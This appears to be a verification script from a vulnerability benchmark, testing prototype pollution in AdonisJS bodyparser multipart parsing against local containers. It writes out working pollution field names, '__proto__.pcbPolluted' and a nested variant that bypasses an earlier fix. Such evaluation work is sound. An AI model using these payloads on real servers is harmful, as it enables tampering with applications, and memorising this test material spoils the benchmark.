#!/usr/bin/env bash
# verify.sh --seed|--residual for PCBV2-0073 adonisjs-bodyparser-cve-2026-48795
# (seed CVE-2026-25754 -> residual CVE-2026-48795; prototype pollution, CWE-1321)
#
# 机制: 服务端跑真实 @adonisjs/bodyparser 的 BodyParserMiddleware (每个 /probe 请求在
#       fresh forked worker 中解析一次 multipart), multipart 字段名作为 lodash 路径
#       送入 FormFields.add -> lodash.set。pollution 成功后服务端把 fresh 空对象继承的
#       pcbPolluted 回显为 canary_value (解析后的 body 永不回显)。
#   seed    : field_name = __proto__.pcbPolluted (直接危险段)
#               v0 (10.1.2, #fields = {} 普通对象)  -> 写入 Object.prototype -> FLAG rc=0
#               v1 (10.1.4, #fields = Object.create(null)) -> 直接段变自有键 -> null  rc=10
#   residual: field_name = user.__proto__.pcbPolluted (嵌套段, 首段良性)
#               v1 (10.1.4, lodash 以普通 {} 建中间容器 user) -> 仍达 Object.prototype
#                   -> FLAG                                                          rc=0
#               v2 (10.1.5, FormFields.add 拒绝含 __proto__ 段) -> null               rc=10
#
# flag 通道: INJECTION 类 —— 验证者把 RUN_FLAG 作为 multipart field_value 嵌入 payload;
#            pollution 成功后服务端在 canary_value 回显该值 (效果依赖嵌入, 非服务端持有)。
# 判定基准: JUDGE_FLAG="${RUN_FLAG_REF:-$RUN_FLAG}" (真 flag 优先)。wrong/stale 检查时
#            嵌入 RUN_FLAG=override -> canary_value=override != 真 flag -> 判定失败 (10)。
# 退出码: 0=效果发生(flag 出现) 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
JUDGE_FLAG="${RUN_FLAG_REF:-$RUN_FLAG}"
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

# 动态解析该版本服务宿主端口 (compose 固定映射 42080/42081; 平台动态端口亦兼容)
PORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-8080}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$VERSION" "$CPORT" 2>/dev/null | head -n1 | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "${PORT:-}" ]] || { echo "verify: port resolve failed for $VERSION" >&2; exit 20; }
echo "verify: $VERSION host port = $PORT"

# readiness: GET /healthz 返回 200 即服务就绪
READY=""
for _ in $(seq 1 30); do
  CODE="$(curl -sS -m 3 -o /dev/null -w '%{http_code}' "http://127.0.0.1:$PORT/healthz" 2>/dev/null || true)"
  if [[ "$CODE" == "200" ]]; then READY=1; break; fi
  sleep 2
done
if [[ -z "$READY" ]]; then echo "verify: service $VERSION not ready on port $PORT" >&2; exit 20; fi

# 构造 candidate: field_value 嵌入 RUN_FLAG (提交值)
"$PY" - "$MODE" "$RUN_FLAG" <<'PYEOF' > "$WORK_DIR/cand.json"
import json, sys
mode, flag = sys.argv[1], sys.argv[2]
if mode == "--seed":
    cand = {"probe_id": "cve-2026-25754-direct-proto-segment", "method": "POST",
            "path": "/probe", "field_name": "__proto__.pcbPolluted", "field_value": flag}
else:
    cand = {"probe_id": "cve-2026-48795-nested-proto-segment", "method": "POST",
            "path": "/probe", "field_name": "user.__proto__.pcbPolluted", "field_value": flag}
print(json.dumps(cand))
PYEOF
echo "candidate: $(cat "$WORK_DIR/cand.json")"

# 动态端口导出（compose 已转 PORT_ 动态端口；seed_exec 的 BASE 由 PCB_TARGET_PORT 覆盖）
CASE_DIR="${CASE_DIR:-$(cd "$(dirname "$0")/.." && pwd)}"
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && export PCB_TARGET_PORT="$_DYN"
export PCB_TARGET_PORT="${PCB_TARGET_PORT:-}"

# 公开执行器 seed_exec.py (curl -F multipart POST); PCB_TARGET_BASE 覆盖 v1 base
OUT="$(PCB_TARGET_BASE="http://127.0.0.1:$PORT" "$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || {
  echo "$OUT" >&2; echo "verify: seed_exec failed" >&2; exit 20; }
echo "$OUT" | head -c 400; echo

# 判定: raw 键 (curl 失败/服务不可达) -> 20 环境失败;
#       canary_value 含 JUDGE_FLAG (真 flag 优先) -> 0, 否则 10
"$PY" - "$OUT" "$JUDGE_FLAG" <<'PYEOF'
import json, sys
try:
    d = json.loads(sys.argv[1])
except Exception:
    print("BAD-JSON:", sys.argv[1][:200]); sys.exit(20)
flag = sys.argv[2]
print("version=%s polluted=%s inner_status=%s" % (
    d.get("version"), d.get("object_prototype_polluted"), d.get("inner_http_status")))
canary = str(d.get("canary_value") or "")
print("canary_value: %s" % canary[:200])
if "raw" in d or "stderr" in d:
    sys.exit(20)
sys.exit(0 if flag in canary else 10)
PYEOF
exit $?
